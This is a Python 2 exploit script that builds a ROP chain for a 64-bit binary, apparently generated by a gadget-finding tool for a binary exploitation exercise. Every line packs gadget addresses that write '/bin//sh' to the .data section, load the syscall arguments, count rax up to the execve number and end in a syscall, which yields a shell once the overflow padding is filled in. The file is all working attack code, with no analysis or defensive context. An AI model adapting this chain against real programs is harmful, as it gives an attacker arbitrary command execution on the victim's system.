#!/usr/bin/env python2
from struct import pack

	# Padding goes here
p = ''

p += pack('<Q', 0x0000000000419342) # pop rsi ; ret
p += pack('<Q', 0x0000000000531120) # @ .data
p += pack('<Q', 0x00000000004246b2) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x00000000004afde5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000419342) # pop rsi ; ret
p += pack('<Q', 0x0000000000531128) # @ .data + 8
p += pack('<Q', 0x0000000000482799) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004afde5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401b82) # pop rdi ; ret
p += pack('<Q', 0x0000000000531120) # @ .data
p += pack('<Q', 0x0000000000419342) # pop rsi ; ret
p += pack('<Q', 0x0000000000531128) # @ .data + 8
p += pack('<Q', 0x0000000000401a8f) # pop rdx ; ret
p += pack('<Q', 0x0000000000531128) # @ .data + 8
p += pack('<Q', 0x0000000000482799) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004e1170) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401353) # syscall
print p
